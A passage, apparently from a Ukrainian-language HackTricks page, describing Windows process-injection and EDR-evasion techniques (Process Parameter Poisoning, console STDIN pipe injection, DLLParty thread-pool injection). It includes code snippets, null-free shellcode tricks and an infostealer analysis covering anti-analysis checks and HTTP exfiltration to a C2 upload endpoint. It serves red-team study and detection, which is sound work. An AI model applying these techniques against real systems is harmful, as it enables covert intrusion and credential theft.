- Підозрілі послідовності `VirtualProtect(Ex)` / `WriteProcessMemory` для сторінок `.text` DLL, за якими створюється потік.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) — це техніка **ін’єкції в процес / обходу EDR**, яка дає змогу уникнути класичного шляху віддаленого запису (`VirtualAllocEx` + `WriteProcessMemory`). Замість копіювання байтів у вже запущений цільовий процес вона використовує той факт, що Windows **копіює вибрані параметри запуску `CreateProcessW` у дочірній процес** і зберігає їх у `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Носії, вразливі до отруєння, які копіює `CreateProcessW`

Корисні носії:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (з `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Практичні обмеження носіїв:

- Для `CreateProcessW` `lpCommandLine` має вказувати на **доступну для запису пам’ять**; його довжина обмежена **32 767 символами Unicode** разом із нульовим термінатором.
- `lpEnvironment` має бути блоком середовища Unicode з послідовними рядками `NAME=VALUE\0`, завершеними додатковим `\0`.
- `lpReserved` офіційно зарезервований, тому відповідність `ShellInfo` слід вважати деталлю реалізації, а не стабільною задокументованою угодою.

Таким чином, звичайне створення процесу перетворюється на **примітив передавання payload**. Оператор створює дочірній процес із контрольованими зловмисником даними запуску, а Windows виконує міжпроцесне копіювання.

### Потік віддаленого пошуку без API віддаленого запису

Після створення дочірнього процесу знайдіть скопійований буфер за допомогою **примітивів лише для читання**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → отримати `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Прочитати віддалений `PEB`
3. Перейти за `PEB.ProcessParameters`
4. Прочитати `RTL_USER_PROCESS_PARAMETERS`
5. Використати вибраний вказівник:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Мінімальний потік:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Виконання скопійованого буфера параметрів

Скопійована область параметрів зазвичай має права `RW`, а не виконувана. Поширений ланцюжок P3:

1. Створити процес звичайним способом (не призупиненим)
2. Зробити вибрану сторінку параметрів виконуваною за допомогою `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Повторно використати дескриптор головного потоку, уже повернутий у `PROCESS_INFORMATION`
4. Перенаправити виконання за допомогою `NtSetContextThread` (`CONTEXT_CONTROL`, перезаписати `RIP`)

На відміну від класичних сценаріїв перехоплення потоку, для цього **не потрібно** викликати `SuspendThread` / `ResumeThread`; контекст можна змінити безпосередньо через дескриптор повернутого головного потоку.

Це дає змогу уникнути кількох API, які часто відстежуються під час ін'єкції:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- часто також `SuspendThread` / `ResumeThread`

### Обмеження нульового байта та багатоступеневий shellcode

Усі три носії — це **рядкові або схожі на рядки дані**, тому під час передавання корисне навантаження, що містить `0x00`, обрізається. Практичний обхідний шлях — **перший етап без нульових байтів**, який відновлює константи під час виконання, а потім завантажує довільний другий етап.

Простий шаблон — синтез констант на основі XOR:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Це дає змогу першому етапу створювати рядки в стеку, аргументи API, шляхи до DLL або завантажувач shellcode другого етапу, не вбудовуючи нульові байти в параметр, що передається.

### Виклики API зі стеку на першому етапі

Якщо першому етапу потрібно викликати API, як-от `LoadLibraryA`, він може:

- розмістити рядок/буфер у стеку цільового процесу
- зарезервувати **32-байтовий shadow space x64**
- задати `RCX`, `RDX`, `R8`, `R9` константами або вказівниками відносно `RSP`
- підтримувати **16-байтове вирівнювання** `RSP` перед викликом

Потім другий етап можна скопіювати зі стеку в область пам’яті `PAGE_READWRITE`, змінити її захист на `PAGE_EXECUTE_READ` за допомогою `VirtualProtect` і передати їй керування, не створюючи безпосередньо область RWX.

### Ідеї для виявлення

Автори згадують такі перспективні напрямки пошуку:

- `VirtualProtectEx` / `NtProtectVirtualMemory`, що надають **сторінкам параметрів процесу** право на виконання
- після цієї зміни захисту — виклик `SetThreadContext` / `NtSetContextThread`
- віддалене читання `PEB`, а потім `RTL_USER_PROCESS_PARAMETERS`
- незвично довгі значення або значення з високою ентропією в `lpCommandLine`, `lpEnvironment` або `STARTUPINFO.lpReserved` під час створення процесу

### Примітки

- P3 — це **трюк для передавання даних між процесами**, а не самостійний повноцінний примітив виконання: скопійованому параметру все ще потрібно надати право на виконання та перенаправити виконання.
- Автори розглядали `RtlCreateProcessReflection` / Dirty Vanity, але відмовилися від нього, оскільки всередині він викликає підозрілі примітиви, зокрема `NtWriteVirtualMemory` і `NtCreateThreadEx`.

## Ін’єкція через pipe STDIN консолі

Інтерактивний дочірній процес консолі також можна використати як **примітив для передавання payload**. Інжектор перенаправляє стандартний ввід дочірнього процесу на pipe і надсилає маркер, а за ним — shellcode. Після того як консольна програма зчитує дані у власну приватну пам’ять, інжектор знаходить цей буфер, надає йому право на виконання та перенаправляє на нього потік дочірнього процесу. Це дає змогу уникнути `VirtualAllocEx` і `WriteProcessMemory`, але все одно є ін’єкцією в процес, а не універсальним обходом EDR.<sup>[[41]](#references)</sup>

Попри опис як "named-pipe", у реалізації з першоджерела викликається `CreatePipe`, який створює **анонімний pipe**. Windows реалізує анонімні pipe за допомогою внутрішніх об’єктів pipe з унікальними іменами, але PoC ані не вибирає шлях `\\.\pipe\<name>`, ані не викликає `CreateNamedPipe`. Він створює успадковувані дескриптори з дескриптором безпеки за замовчуванням, передає дескриптор читання в `STARTUPINFO.hStdInput`, задає `STARTF_USESTDHANDLES` і запускає новий дочірній процес з увімкненим успадкуванням дескрипторів. Отже, цей PoC запускає вказаний виконуваний файл консолі, а не під’єднує свій pipe до наявного процесу.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Типовий порядок дій

У реалізації використовується такий ланцюжок:<sup>[[41]](#references)</sup>

1. Створити пари анонімних pipe для `STDIN` і `STDOUT` дочірнього процесу. Вимкнути успадкування для двох дескрипторів з боку батьківського процесу, а після створення процесу закрити в батьківському процесі дублікати дескрипторів з боку дочірнього.
2. Запустити інтерактивний виконуваний файл, наприклад `netsh.exe` або `nslookup.exe`, з прапорцем `CREATE_NEW_CONSOLE`. Дочірній процес успадкує перенаправлені стандартні дескриптори.
3. Надіслати весь бінарний масив `rawData` через `WriteFile` з використанням дескриптора `STDIN` з боку батьківського процесу. Консольна програма обробить байти та збереже копію в одній зі своїх приватних виділених областей пам’яті.
4. Переглянути адресний простір дочірнього процесу за допомогою `VirtualQueryEx`, прочитати можливі області `MEM_PRIVATE` через `ReadProcessMemory` і знайти маркер на початку `rawData`.
5. Змінити захист знайденого буфера на `PAGE_EXECUTE_READWRITE` за допомогою `VirtualProtectEx`.
6. Визначити основний потік, призупинити його, задати `RIP` рівним `found_address + 0x19` за допомогою `NtSetContextThread` і відновити його роботу.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Надана реалізація призначена лише для x64: вона змінює `CONTEXT.Rip`, а вбудований payload — це x64 shellcode. `rawData` починається з маркера завдовжки 25 байтів, тому виконувані байти починаються зі шістнадцяткового зміщення `0x19`. Замінюючи payload, збережіть цю структуру або разом оновіть маркер, вектор пошуку, розмір масиву та зміщення виконання. У коментарях до вихідного коду також зазначено `0x0A`, `0x0D` і `0x1A` як заборонені символи. Цей процес не змінює токен чи привілеї дочірнього процесу.<sup>[[41]](#references)</sup>

Приклади невеликих native-помічників і шаблонів компіляції payload див. у розділі [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## Ін'єкція DLL через callback thread pool без shellcode (DLLParty)

DLLParty адаптує ін'єкцію через thread pool у стилі PoolParty так, щоб наявний worker цільового процесу викликав `LoadLibraryA` замість виконання ін'єктованого callback stub. Примітивом диспетчеризації є `TP_DIRECT`, поставлений у чергу порту завершення I/O цільового pool. Це не обходить дозволи процесу: PoC викликає `OpenProcess(PROCESS_ALL_ACCESS)` і потребує доступу на читання/запис до пам'яті цільового процесу та можливості дублювати handles worker-factory і порту завершення.<sup>[[46]](#references)[[47]](#references)</sup>

У Windows x64 worker передає в `RCX` вказівник на `TP_CALLBACK_INSTANCE`, розміщений у його стеку; це перший аргумент callback. `LoadLibraryA` інтерпретує цей самий вказівник як `LPCSTR`. У перевіреному сценарії `TppWorkerThread` формує вказівник за адресою `RSP+0x178`, а перший звичайний запис у цей об'єкт виконується за адресою `RSP+0x1d0`. Тому шлях до DLL із нульовим завершувачем, що вміщується в цей префікс завдовжки 0x58 байтів, можна розмістити на початку instance, не побоюючись перезапису до диспетчеризації. Це спостереження стосується конкретної збірки, а не є документованою гарантією ABI Windows.<sup>[[46]](#references)[[47]](#references)</sup>

Еталонний процес такий:<sup>[[46]](#references)[[47]](#references)</sup>

1. Перелічіть handles цільового процесу за допомогою `NtQuerySystemInformation(SystemHandleInformation)` і визначте `TpWorkerFactory`, запитавши типи об'єктів. Дублюйте handle worker-factory і запитайте `WorkerFactoryBasicInformation`; поле `StartParameter` містить адресу віддаленого `TP_POOL`. Пропускайте фабрики, для яких `TotalWorkerCount == 0`.
2. Прочитайте `TP_POOL.CompletionPort` і пройдіть приватним списком workers pool. У перевіреній збірці Windows 10 19045 x64 (`ntdll.dll 10.0.19041.4842`) його початок розташований за адресою `pool+0x60`; кожен link — за адресою `worker+0x10`, тому слот callback-instance за адресою `worker+0x38` дорівнює `link+0x28`. PoC перевіряє вирівнювання вказівників, взаємність links, належність до pool, ненульові ID потоків, повторювані вузли та незмінність початку списку.
3. Запишіть шлях до DLL у **кожен** знайдений слот worker, оскільки поставлене в чергу completion може обробити будь-який worker. Розмістіть `TP_DIRECT` із `Callback = LoadLibraryA` у доступній для запису пам'яті цільового процесу. Замість `VirtualAllocEx` PoC використовує адресу `last_slot-0x500` у стеку worker; це експериментальне зміщення, яке не має перекриватися з активними даними стека.
4. Дублюйте handle порту завершення цільового процесу й викличте `ZwSetIoCompletion(port, remote_direct, 0, 0, 0)`. Адреса віддаленого `TP_DIRECT` використовується як completion key. Наявний worker викликає `LoadLibraryA` із перезаписаним вказівником callback-instance, завантажуючи DLL, доступну цільовому процесу.

PoC приймає PID цільового процесу (`DLLParty.exe <target_pid>`) і використовує жорстко заданий шлях до DLL у `DLLParty.cpp`; перед збиранням x64-виконуваного файла вкажіть шлях, доступний цільовому процесу. Також використовує адресу `LoadLibraryA` із власного процесу, тож передбачає, що ця адреса є дійсною і в цільовому процесі. Код не перевіряє, чи вміщується шлях у префікс завдовжки 0x58 байтів, і чи знайдено слот під час обходу workers, перш ніж індексувати останній елемент. Повторно перевірте приватні зміщення, структуру стека та доступну для запису пам'ять для цільової збірки. Відмова від `CreateRemoteThreadEx`, shellcode і `VirtualAllocEx` не усуває записів між процесами чи телеметрії завантаження DLL.<sup>[[46]](#references)[[47]](#references)</sup>

## Тактики SantaStealer для fileless-ухилення та крадіжки облікових даних

SantaStealer (також відомий як BluelineStealer) демонструє, як сучасні викрадачі інформації поєднують обхід AV, протидію аналізу та доступ до облікових даних в одному процесі.<sup>[[24]](#references)</sup>

### Визначення розкладки клавіатури та затримка в sandbox

- Прапорець конфігурації (`anti_cis`) перелічує встановлені розкладки клавіатури через `GetKeyboardLayoutList`. Якщо знайдено кириличну розкладку, зразок створює порожній маркер `CIS` і завершує роботу до запуску stealer-ів. Так він не активується в виключених регіонах, але залишає артефакт для пошуку.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Багаторівнева логіка `check_antivm`

- Варіант A проходить список процесів, хешує кожне ім’я за допомогою власної ковзної контрольної суми та порівнює її зі вбудованими списками для debugger-ів/sandbox-ів; також повторно обчислює контрольну суму для імені комп’ютера й перевіряє робочі каталоги, як-от `C:\analysis`.
- Варіант B перевіряє властивості системи (мінімальну кількість процесів, недавній час роботи), викликає `OpenServiceA("VBoxGuest")` для виявлення VirtualBox additions і виконує перевірки часу навколо затримок, щоб виявити single-stepping. За будь-якого збігу виконання переривається до запуску модулів.

### Fileless helper + подвійне reflective loading через ChaCha20

- Основна DLL/EXE містить Chromium credential helper, який або записується на диск, або вручну відображається в пам’яті; у fileless-режимі він самостійно розв’язує імпорти/релокації, тому жодних артефактів helper-а не записується.
- Цей helper зберігає DLL другого етапу, двічі зашифровану ChaCha20 (два 32-байтові ключі + 12-байтові nonce). Після обох проходів він reflectively завантажує blob (без `LoadLibrary`) і викликає експорти `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, похідні від [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Процедури ChromElevator використовують process hollowing із reflective injection та прямими syscall, щоб впровадитися в активний браузер Chromium, успадкувати ключі AppBound Encryption і розшифрувати паролі/cookie/дані кредитних карток безпосередньо з баз даних SQLite, попри посилений захист ABE.

### Модульний збір у пам’яті та фрагментована HTTP-ексфільтрація

- `create_memory_based_log` перебирає глобальну таблицю вказівників на функції `memory_generators` і запускає по одному потоку для кожного ввімкненого модуля (Telegram, Discord, Steam, знімки екрана, документи, розширення браузера тощо). Кожен потік записує результати у спільні буфери та повідомляє кількість файлів після очікування завершення протягом приблизно 45 секунд.
- Після завершення все архівується за допомогою статично скомпонованої бібліотеки `miniz` у `%TEMP%\\Log.zip`. Потім `ThreadPayload1` чекає 15 секунд і передає архів фрагментами по 10 MB через HTTP POST на `http://<C2>:6767/upload`, підробляючи браузерний boundary `multipart/form-data` (`----WebKitFormBoundary***`). До кожного фрагмента додаються `User-Agent: upload`, `auth: <build_id>` і, за наявності, `w: <campaign_tag>`, а до останнього фрагмента додається `complete: true`, щоб C2 знав, що повторне збирання завершено.

## References

- [1] [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Dynamic-link library search order](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Process security and access rights](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Hiding Your Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Abusing Chrome Remote Desktop On Red Team Operations A Practical Guide](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Weaponizing Defender's Remediation Driver as a Kernel Operation Primitive](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [MDSec Function Peekaboo companion code](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: Crafting Self-Masking Functions Using LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT - InjectSetConsole source](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - CreatePipe function](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Creating a Child Process with Redirected Input and Output](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian - GhostPack Necromancy: Reforging C# Tools with WasmForge](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge - Compiling C# / .NET Projects](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [DLLParty proof-of-concept and source](https://github.com/epersic/DLLParty)
- [47] [DLLParty — Abusing thread pool internals for shellcodeless DLL injection](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)

{{#include ../banners/hacktricks-training.md}}
